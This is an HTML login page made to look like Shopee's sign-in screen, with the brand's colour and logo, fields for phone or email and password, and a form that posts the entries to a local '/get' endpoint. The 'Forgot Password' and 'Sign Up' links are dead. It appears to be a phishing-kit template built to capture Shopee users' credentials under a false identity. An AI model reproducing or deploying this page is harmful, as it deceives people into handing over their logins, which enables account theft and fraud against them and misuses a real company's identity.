<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Shopee</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
        background-color: #ee4d2d;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 400px;
        background: #fff;
        border-radius: 4px;
        padding: 40px 32px;
        text-align: center;
      }
      #logo {
        margin-bottom: 20px;
      }
      .g-h1 {
        font-size: 20px;
        font-weight: 600;
        color: #333;
        margin-bottom: 4px;
      }
      .g-h2 {
        font-size: 14px;
        color: #666;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 12px 16px;
        border: 1px solid #e0e0e0;
        border-radius: 2px;
        font-size: 14px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #ee4d2d;
      }
      .gbtn-primary {
        width: 100%;
        padding: 12px;
        background-color: #ee4d2d;
        color: #fff;
        border: none;
        border-radius: 2px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: #d74325;
      }
      .link {
        display: block;
        margin-top: 16px;
        color: #ee4d2d;
        font-size: 14px;
        text-decoration: none;
        font-weight: 600;
      }
      .link:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 24px;
        font-size: 12px;
        color: #666;
      }
      .footer a {
        color: #ee4d2d;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 100 30" width="100" height="30">
        <text x="50%" y="24" text-anchor="middle" font-family="Arial" font-weight="800" font-size="26" fill="#ee4d2d">Shopee</text>
      </svg>
      <h1 class="g-h1">Log In</h1>
      <p class="g-h2">Enter email & password to login</p>
      <form action="/get" method="POST">
        <input class="g-input" type="text" name="email" placeholder="Phone Number / Email" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">LOG IN</button>
      </form>
      <a href="#" class="link">Forgot Password</a>
      <p class="footer">New to Shopee? <a href="#">Sign Up</a></p>
    </div>
  </body>
</html>
